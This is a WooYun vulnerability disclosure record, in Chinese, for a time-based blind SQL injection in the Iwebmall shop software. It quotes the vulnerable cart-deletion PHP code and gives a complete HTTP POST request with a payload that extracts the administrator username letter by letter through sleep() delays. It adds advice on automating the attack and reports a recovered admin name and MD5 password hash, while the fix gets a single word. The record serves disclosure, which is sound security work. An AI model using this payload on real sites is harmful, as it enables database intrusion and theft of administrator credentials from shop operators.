{"id": 42197, "wybug_id": "wooyun-2014-086466", "wybug_title": "Iwebmall 最新版SQL注入第二枚", "wybug_corp": "Jooyea", "wybug_author": "路人甲", "wybug_date": "2014-12-10 11:25", "wybug_open_date": "2015-03-10 11:26", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： Iwebmall 最新版SQL注入第二枚 详细说明：  看到wooyun上有人提了几个iweb的漏洞（ WooYun: iwebmall商城程序sql注入 ），我来捡捡漏儿吧，希望不要重复。先把注入点拿出来：www.xxx.com/do.php?act=user_cart_del ，POST的内容中有个参数goods，存在注入。/action/user/cart_del.action.php\n无关代码if(empty($_POST)){\t$cart_id = intval(get_args('id'));}else{\t$goods=get_args('goods');\tif (!$goods){\t\taction_return(1,$m_langpackage->m_del_select,'modules.php?app=user_cart');\t}\t$cart_id=implode(',',$goods);}$goods_id = is_array(get_args('goods_id'))?get_args('goods_id'):array(get_args('goods_id'));//数据库操作if ($user_id) {\tdbtarget('r',$dbServs);\t$dbo=new dbex();\t$sql = \"select * from `$t_cart` where user_id='$user_id' and cart_id in($cart_id)\";\t//echo $sql;\t//exit;\t$result = $dbo->getRs($sql);\tforeach ($result as $key=>$value){\t\t$car=get_session('cart');\t\tif (isset($car[$value['goods_id']])) {\t\t\tunset($car[$value['goods_id']]);\t\t\tset_session('cart',$car);\t\t}\t}\tif(!$result) {\t\taction_return(0,$m_langpackage->m_cartnotthis_goods);\t}}elseif ((!$user_id)&&(!empty($goods_id))){\tforeach ($goods_id as $value){\t\t$car=get_session('cart');\t\tunset($car[$value]);\t\tset_session('cart',$car);\t}}无关代码\n当通过POST方法提交$goods时，由于没有对$goods进行过滤，因此这里可以注入。Iweb没有错误回显，这里用time-based blind进行注入测试。Payload:\nPOST /do.php?act=user_cart_del HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*Referer: http://192.168.0.107/modules.php?app=user_favoriteAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 192.168.0.107Content-Length: 184Proxy-Connection: Keep-AlivePragma: no-cacheCookie: AJSTAT_ok_times=1; PHPSESSID=c8hhcsboh7fk3c43co6ik5m796; iweb_iweb_login=pigtestgoods%5B%5D=1) or (select if(mid((select admin_name from imall_admin_user where admin_id=1 limit 0,1),2,1)='z',sleep(3),0)) and (1)=(1&deletesubmit=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4\n测试时：登陆后访问如上的请求，抓包，按上面的payload进行修改即可。这里注意，goods的值随便写一个值，本例为1。因为是time-based blind 注入，猜测管理员用户名的第二个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟8s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： 21232f297a57a5a743894a0e4a801fc3   漏洞证明：  见 详细说明   修复方案：  intval   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}